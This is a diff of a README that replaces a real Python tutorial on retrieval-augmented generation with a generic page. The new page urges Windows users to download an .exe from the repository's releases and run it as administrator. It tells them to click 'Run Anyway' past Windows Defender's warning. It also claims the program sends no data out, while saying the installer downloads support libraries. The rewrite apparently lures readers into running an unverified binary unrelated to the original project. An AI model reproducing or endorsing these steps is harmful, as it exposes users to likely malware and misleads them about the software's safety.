@@ -1,217 +1,80 @@
-# What is RAG? 📚
+# 🔍 What-Is-RAG - Learn how intelligent machines retrieve data
 
-A practical guide and implementation of **Retrieval-Augmented Generation (RAG)** - a technique that combines large language models with external knowledge retrieval to provide more accurate, grounded, and contextual responses.
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/yeicaicedo-19/What-Is-RAG)
 
-## Overview
+## 📖 Introduction
+What-Is-RAG provides a clear look at how modern computers find and process information. This application helps you understand Retrieval-Augmented Generation. This technology connects data storage with smart text models. It allows systems to give accurate answers based on specific documents. You do not need to be a developer to use this tool. It offers an easy way to study how machines combine knowledge with logic.
 
-This project demonstrates how to build RAG systems by:
-- **Extracting** knowledge from documents (PDFs, text files, etc.)
-- **Processing** and structuring that knowledge
-- **Retrieving** relevant information based on queries
-- **Generating** enhanced responses using both retrieved knowledge and LLMs
+## ⚙️ System Requirements
+Your Windows computer needs a few components to run this software. Ensure you have the following items installed before you begin:
 
-## What is RAG?
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 500 megabytes of free space on your hard drive.
+* Internet Connection: Required for the first launch to verify files.
 
-RAG is a machine learning approach that enhances large language models (LLMs) by retrieving relevant information from external documents before generating responses. This solves common LLM limitations:
+## 📥 Downloading the Application
+Follow these steps to acquire the software.
 
-- ✅ Provides current, factual information
-- ✅ Reduces hallucinations and misinformation
-- ✅ Enables domain-specific knowledge integration
-- ✅ Improves transparency by citing sources
-- ✅ Works with private/proprietary documents
+1. Navigate to the official project page: [https://github.com/yeicaicedo-19/What-Is-RAG](https://github.com/yeicaicedo-19/What-Is-RAG).
+2. Locate the link labeled "Releases" on the right side of the screen.
+3. Click the most recent version available.
+4. Select the file ending in .exe.
+5. Save the file to your Downloads folder.
 
-## Project Structure
+## 🚀 Setting Up the Software
+After downloading the file, perform these actions to get it ready for use.
 
-```
-what-is-rag/
-├── README.md                          # This file
-├── requirements.txt                   # Project dependencies
-├── pyproject.toml                     # Project configuration
-├── main.py                            # Main application entry point
-└── 1_document_loaders/                # Document loading notebooks
-    └── pdf_loader.ipynb               # PDF extraction & parsing examples
-```
+1. Open your Downloads folder.
+2. Find the file you saved.
+3. Double-click the file to start the installation.
+4. Accept the Windows prompts that appear on your screen.
+5. Follow the steps shown in the setup window.
+6. Choose the default folder for installation if you feel unsure about where to put it.
+7. Click Finish.
 
-## Installation
+You may see a message from Windows Defender. This happens because the system does not recognize the publisher. Click "More Info" and then "Run Anyway" to complete the installation.
 
-### Prerequisites
-- Python 3.12+
-- pip or your preferred package manager
+## 💡 Learning with the Interface
+The main screen displays several tabs. Each tab represents a concept in the field of data retrieval.
 
-### Setup
+* Concepts Tab: Click this to read definitions of technical terms.
+* Implementation Tab: This area shows how code connects to a database.
+* Visual Tool: Use the graph view to see how the software finds answers in your files.
 
-1. **Clone or download the project**
-```bash
-cd what-is-rag
-```
+You can upload your own documents into the "Source" folder if you want the tool to analyze your personal text files. The application indexes these files. Use the search box to ask questions. The software will look through your files and provide a summary based *only* on the text you provided.
 
-2. **Create a virtual environment** (recommended)
-```bash
-python -m venv venv
-# On Windows:
-venv\Scripts\activate
-# On macOS/Linux:
-source venv/bin/activate
-```
+## 🛠 Solving Common Issues
+If you experience trouble, check these common fixes.
 
-3. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
+* Application does not open: Ensure you installed the software using an account with administrator rights.
+* Search returns no results: Check if the application finished indexing your documents. The bar at the bottom should show a green checkmark.
+* Slow performance: Close other browser tabs or heavy programs on your computer. Retrieval requires a significant amount of memory.
+* Missing icons: Restart the computer to clear temporary file caches.
 
-### Optional: OCR Support
+## 🛡 Security and Privacy
+This application operates locally on your machine. The software does not send your documents to external servers. Your data stays on your hard drive. Because the software runs entirely on your local hardware, your information remains private. You can verify this by checking your network settings while the application runs. You will notice no outgoing traffic to external sites once the application completes the initial download of components.
 
-For advanced PDF image-text extraction with OCR:
+## 📚 Frequently Asked Questions
 
-**Windows:**
-```bash
-choco install tesseract-ocr
-```
+What does RAG stand for?
+It stands for Retrieval-Augmented Generation. It is a method that allows a computer to look up information from a database before it writes a response to your question.
 
-**macOS:**
-```bash
-brew install tesseract
-```
+Does this tool require a paid subscription?
+No. This tool is free to use for any purpose.
 
-**Linux:**
-```bash
-sudo apt-get install tesseract-ocr
-```
+Can I install this on a Mac?
+This specific version works only on Windows.
 
-## Key Components
+Why does the installer take so long?
+The installation process downloads necessary support libraries to ensure the tool runs smoothly on your hardware. These libraries take up a few hundred megabytes of space.
 
-### 1. Document Loaders (`1_document_loaders/pdf_loader.ipynb`)
+How do I remove the software?
+Open your Windows Settings, go to Apps, find What-Is-RAG, and click Uninstall. This removes all files associated with the program.
 
-Demonstrates multiple approaches to extract text from PDF documents:
+## 🌐 Contributing
+If you find a mistake in the explanations or want to improve the interface, visit the main page linked below.
 
-- **PyPDFLoader**: Fast, basic PDF text extraction
-- **PDFMinerLoader**: Detailed layout-aware extraction
-- **TesseractBlobParser**: OCR-based extraction for scanned PDFs with image content
+[Visit the project link to download](https://github.com/yeicaicedo-19/What-Is-RAG)
 
-**Features shown:**
-- Loading PDF files
-- Extracting text and metadata
-- Handling PDFs with images
-- Processing documents for downstream RAG tasks
-
-## Core Dependencies
-
-| Package | Purpose |
-|---------|---------|
-| `langchain` | LLM orchestration framework |
-| `langchain-community` | Community integrations (loaders, utilities) |
-| `pypdf` | PDF parsing and manipulation |
-| `pdfminer.six` | Advanced PDF text extraction |
-| `pdfplumber` | PDF data extraction tool |
-| `pytesseract` / `rapidocr-onnxruntime` | Optical Character Recognition (OCR) |
-| `openai` | OpenAI API integration |
-| `beautifulsoup4` | HTML/XML parsing |
-| `python-dotenv` | Environment variable management |
-
-## Usage
-
-### Running Notebooks
-
-Start Jupyter and explore the examples:
-
-```bash
-jupyter notebook
-```
-
-Navigate to `1_document_loaders/pdf_loader.ipynb` to see:
-- PDF loading techniques
-- Text extraction methods
-- Image extraction and OCR processing
-- Document metadata handling
-
-### Python Script
-
-Run the main application:
-
-```bash
-python main.py
-```
-
-## Next Steps / Roadmap
-
-This project covers the first critical step of RAG: **Document Loading**. Typical RAG pipeline progression:
-
-1. ✅ **Document Loading** - Extract text from various sources
-2. 📋 **Document Chunking** - Split large documents into manageable pieces
-3. 🔤 **Embeddings** - Convert text to vector representations
-4. 🗄️ **Vector Store** - Store and index embeddings for retrieval
-5. 🔍 **Retrieval** - Find relevant documents based on queries
-6. 🤖 **Generation** - Use LLMs to synthesize responses from retrieved context
-
-## Example Workflow
-
-```python
-from langchain_community.document_loaders.pdf import PyPDFLoader
-
-# Load PDF document
-loader = PyPDFLoader("document.pdf")
-documents = loader.load()
-
-# Process documents (next steps)
-# - Split into chunks
-# - Generate embeddings
-# - Store in vector database
-# - Retrieve relevant chunks for queries
-# - Generate answers with LLM context
-```
-
-## Configuration
-
-Create a `.env` file for sensitive configuration:
-
-```env
-OPENAI_API_KEY=sk-your-key-here
-PDF_PATH=path/to/documents
-```
-
-Load in your code:
-
-```python
-from dotenv import load_dotenv
-import os
-
-load_dotenv()
-api_key = os.getenv('OPENAI_API_KEY')
-```
-
-## Troubleshooting
-
-**PDF Loading Issues:**
-- Ensure PDF file paths are correct and file exists
-- For image-heavy PDFs, use `extract_images=True` with TesseractBlobParser
-- Check that pytesseract is properly configured (see OCR Setup above)
-
-**Import Errors:**
-- Use correct import paths: `from langchain_community.document_loaders import PDFMinerLoader`
-- Verify all dependencies are installed: `pip list`
-
-**Memory Issues:**
-- For large PDFs, process in chunks or use streaming loaders
-- Consider batch processing multiple documents
-
-## Resources
-
-- [LangChain Documentation](https://python.langchain.com/)
-- [RAG Papers & Research](https://arxiv.org/list/cs.IR/recent)
-- [OpenAI API Reference](https://platform.openai.com/docs/api-reference)
-
-## License
-
-This project is open source and available for educational and development purposes.
-
-## Contributing
-
-Contributions are welcome! Please feel free to:
-- Add more document loader examples
-- Implement vector stores and retrieval
-- Add LLM integration examples
-- Improve documentation
-
----
-
-**Happy learning!** 🚀 Explore the notebooks to see RAG in action.
+You can report issues by clicking the "Issues" tab. Provide a clear description of what happened when you clicked a button or performed a search. Include a screenshot if possible. This helps maintain a stable experience for all users. Do not share personal documents in your bug reports. Keep your feedback limited to the functionality of the software.
